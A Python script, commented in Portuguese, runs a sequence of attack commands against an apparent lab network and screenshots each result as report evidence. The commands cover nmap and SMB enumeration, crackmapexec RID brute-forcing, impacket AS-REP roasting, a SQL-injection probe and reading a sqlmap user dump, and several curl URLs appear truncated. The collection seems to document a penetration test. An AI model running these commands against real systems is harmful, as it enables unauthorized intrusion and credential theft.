import os
import subprocess
import time
import pyautogui

# Pasta centralizada onde as imagens finais vão cair
PASTA_IMAGENS = "evidencias_prints"
os.makedirs(PASTA_IMAGENS, exist_ok=True)

def executar_e_printar(nome_print, comando, delay=5):
    """Limpa a tela, roda o comando puramente na tela e captura o print."""
    # Limpa o terminal antes de cada comando para o print ficar limpo
    os.system('clear')
    
    print(f"[$] Executando: {comando}\n")
    time.sleep(1) # Pequena pausa para a limpeza de tela assentar
    
    # Executa em background para o Python conseguir disparar o print no meio do processo
    processo = subprocess.Popen(comando, shell=True, stdout=None, stderr=subprocess.STDOUT)
    
    # Aguarda o tempo necessário para o output preencher a tela do terminal
    time.sleep(delay)
    
    # Tira o screenshot da tela inteira
    print_path = os.path.join(PASTA_IMAGENS, f"{nome_print}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(print_path)
    
    # Aguarda o término definitivo do comando antes de ir para o próximo
    processo.wait()

# ==============================================================================
# F01 — Descoberta da Rede
# ==============================================================================
executar_e_printar("F01_arp_scan", "sudo arp-scan -l", delay=4)

executar_e_printar("F01_ping_sweep", "nmap -sn 10.10.100.0/24", delay=5)

executar_e_printar(
    "F01_scan_completo", 
    "sudo nmap -sS -sV -O --open -p- -T3 10.10.100.2 10.10.100.3 10.10.100.100", 
    delay=20
)

executar_e_printar(
    "F01_scan_dc", 
    "sudo nmap -sS -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985 --script=banner,smb-os-discovery 10.10.100.2", 
    delay=8
)

# ==============================================================================
# F02 — SMB
# ==============================================================================
executar_e_printar("F02_smb_security", "nmap -p 445 --script smb-security-mode,smb2-security-mode 10.10.100.2", delay=4)

executar_e_printar("F02_smb_shares", "smbclient -L //10.10.100.2 -N 2>/dev/null", delay=3)

executar_e_printar("F02_cme_dc", "crackmapexec smb 10.10.100.2 2>/dev/null", delay=4)

# ==============================================================================
# F03 — LDAP
# ==============================================================================
executar_e_printar("F03_ldap_bind_test", "ldapsearch -x -H ldap://10.10.100.2 -b '' -s base namingContexts 2>&1", delay=3)

executar_e_printar("F03_rid_brute", "crackmapexec smb 10.10.100.2 --rid-brute 2>/dev/null", delay=6)

executar_e_printar("F03_cme_users", "crackmapexec smb 10.10.100.2 --users 2>/dev/null", delay=6)

# ==============================================================================
# F04 — Kerberos
# ==============================================================================
executar_e_printar("F04_dns_test", "nslookup corp.local 10.10.100.2", delay=3)

executar_e_printar(
    "F04_asrep_candidates", 
    "impacket-GetNPUsers corp.local/ -usersfile F04_Kerberos/alef/userlist.txt -no-pass -dc-ip 10.10.100.2 2>/dev/null", 
    delay=5
)

executar_e_printar("F04_password_policy", "crackmapexec smb 10.10.100.2 --pass-pol 2>/dev/null", delay=5)

# ==============================================================================
# F08 — Servidor .100
# ==============================================================================
executar_e_printar("F08_nmap_100", "sudo nmap -sS -sV -O --open -p- -T3 10.10.100.100", delay=15)

executar_e_printar("F08_nodered_settings", "curl -s http://10.10.100", delay=3)

executar_e_printar("F08_nodered_flows", "curl -s http://10.10.100", delay=3)

executar_e_printar(
    "F08_mqtt_topics", 
    "timeout 10 mosquitto_sub -h 10.10.100.100 -p 1883 -t '#' -v 2>/dev/null", 
    delay=6
)

executar_e_printar("F08_sqli_test", "curl -s \"http://10.10.100'\"", delay=3)

executar_e_printar("F08_users_dump", "cat /root/.local/share/sqlmap/output/10.10.100.100/dump/portal_operacoes/users.csv", delay=2)

executar_e_printar("F08_http_headers", "curl -s -I http://10.10.100", delay=2)

# ==============================================================================
# F09 — Script Python
# ==============================================================================
executar_e_printar("F09_scanner_output", "python3 cymag_v2.py 10.10.100.100 2>&1", delay=12)

os.system('clear')
print(f"\n[+] Tudo pronto! Os prints limpos foram salvos na pasta: ./{PASTA_IMAGENS}/")
